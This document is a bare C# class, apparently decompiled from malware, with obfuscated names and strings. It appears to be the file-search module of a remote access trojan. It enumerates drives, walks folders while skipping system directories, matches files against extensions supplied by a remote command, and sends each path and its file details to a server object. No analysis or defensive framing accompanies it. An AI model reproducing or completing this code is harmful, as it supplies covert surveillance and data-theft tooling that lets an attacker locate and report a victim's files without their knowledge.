using System;
using System.Collections.Generic;
using System.IO;

namespace irvrmjavhica;

internal class DEROIVF
{
	public List<string> irvrmjavhicanotDtders = new List<string>();

	public string irvrmjavhicamaithath;

	public int irvrmjavhicasErdx = 0;

	public List<string> irvrmjavhicrsFildes = new List<string>();

	public string irvrmjavhicafilesLwgs = DAEONIF.irvrmjavhicafilesLwgs;

	public int irvrmjavhicafIndx = 0;

	public bool irvrmjavhicareding = false;

	public MROIDM iserdrver;

	public List<string> irvrmjavhicafExdts = new List<string>();

	public DEROIVF()
	{
		irvrmjavhicanotDtders.Add("program files|irvrmjavhica".Split(new char[1] { '|' })[0]);
		irvrmjavhicanotDtders.Add("system volume information|irvrmjavhica".Split(new char[1] { '|' })[0]);
		irvrmjavhicanotDtders.Add("windows|irvrmjavhica".Split(new char[1] { '|' })[0]);
		irvrmjavhicanotDtders.Add("program files (x86)|irvrmjavhica".Split(new char[1] { '|' })[0]);
		irvrmjavhicanotDtders.Add("programdata|irvrmjavhica".Split(new char[1] { '|' })[0]);
	}

	public bool irvrmjavhicaseye_acdss(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string irvrmjavhicalorkupDrive()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|irvrmjavhica".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public IEnumerable<string> irvrmjavhicaadydFdles(string path)
	{
		Queue<string> moreFdes = new Queue<string>();
		moreFdes.Enqueue(path);
		while (moreFdes.Count > 0 && !iserdrver.irvrmjavhicarutCdnls)
		{
			path = moreFdes.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (irvrmjavhicaseye_acdss(text) && !irvrmjavhicanotDtders.Contains(text.ToLower()))
					{
						moreFdes.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void irvrmjavhicaloyokFdle(string tempStr)
	{
		iserdrver.irvrmjavhicarutCdnls = false;
		irvrmjavhicafExdts.Clear();
		irvrmjavhicrsFildes.Clear();
		irvrmjavhicafIndx = 0;
		irvrmjavhicasErdx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				irvrmjavhicafExdts.Add(text);
			}
		}
		if (array[1] != "")
		{
			irvrmjavhicareding = true;
			irvrmjavhicaseyndDaich(array[1]);
			irvrmjavhicareding = false;
			iserdrver.irvrmjavhicapuysh_data(null, "irvrmjavhica-seyard=seayhed|irvrmjavhica".Split(new char[1] { '|' })[0]);
		}
	}

	public string irvrmjavhicaloyokopFdile(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|irvrmjavhica".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string irvrmjavhicachyeckFulder(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (irvrmjavhicaseye_acdss(text2))
				{
					text = text + text2 + ">|irvrmjavhica".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void irvrmjavhicaseyndDaich(string path)
	{
		try
		{
			foreach (string item in irvrmjavhicaadydFdles(path))
			{
				string extension = Path.GetExtension(item);
				if (irvrmjavhicafExdts.Contains(extension.ToLower()))
				{
					string text = iserdrver.irvrmjavhicafiyle_info(item, ret: true);
					iserdrver.irvrmjavhicapuysh_data(null, "irvrmjavhica-seyarf=|irvrmjavhica".Split(new char[1] { '|' })[0] + item + "<FIYLE_AUYTO<|irvrmjavhica".Split(new char[1] { '|' })[0] + text);
				}
				if (iserdrver.irvrmjavhicarutCdnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}
}
